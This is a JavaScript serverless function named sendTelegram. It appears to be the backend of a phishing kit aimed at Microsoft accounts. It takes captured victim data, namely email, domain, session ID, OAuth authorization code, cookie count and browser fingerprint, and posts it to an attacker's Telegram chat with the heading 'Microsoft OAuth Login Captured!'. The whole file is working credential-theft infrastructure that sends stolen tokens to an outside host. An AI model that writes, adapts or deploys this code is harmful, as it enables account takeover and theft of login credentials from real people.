const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting...');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data:', JSON.stringify(data, null, 2));

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    console.log('🔧 Environment check:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      tokenStart: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'missing'
    });

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Prepare message content
    const email = data.email || 'oauth-user@microsoft.com';
    const domain = data.domain || 'unknown-domain';
    const sessionId = data.sessionId || 'no-session';
    const hasAuthCode = data.authorizationCode || data.hasAuthCode || false;
    const authCode = data.authorizationCode || 'Not captured';
    
    const timestamp = new Date().toISOString();
    
    let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
    messageText += `📧 Email: ${email}\n`;
    messageText += `🌐 Domain: ${domain}\n`;
    messageText += `🔑 Session ID: ${sessionId}\n`;
    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured' : 'Missing'}\n`;
    messageText += `🕒 Time: ${timestamp}\n\n`;
    
    if (authCode && authCode !== 'Not captured') {
      messageText += `📋 Authorization Code:\n\`${authCode}\`\n\n`;
    }
    
    // Add cookie info if available
    if (data.cookies && Array.isArray(data.cookies) && data.cookies.length > 0) {
      messageText += `🍪 Cookies: ${data.cookies.length} captured\n`;
    } else {
      messageText += `🍪 Cookies: None captured\n`;
    }
    
    // Add browser fingerprint if available
    if (data.browserFingerprint) {
      messageText += `🖥️ Browser: ${data.browserFingerprint.userAgent ? data.browserFingerprint.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
    }

    console.log('📤 Sending message to Telegram:', messageText.substring(0, 200) + '...');

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      parse_mode: 'Markdown'
    };

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response:', result);

    if (!response.ok || !result.ok) {
      console.error('❌ Telegram API error:', result);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to send to Telegram',
          telegramError: result,
          statusCode: response.status
        }),
      };
    }

    console.log('✅ Successfully sent to Telegram');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully',
        telegramMessageId: result.result?.message_id
      }),
    };

  } catch (error) {
    console.error('❌ Handler error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        details: error.message,
        stack: error.stack
      }),
    };
  }
};

module.exports = { handler };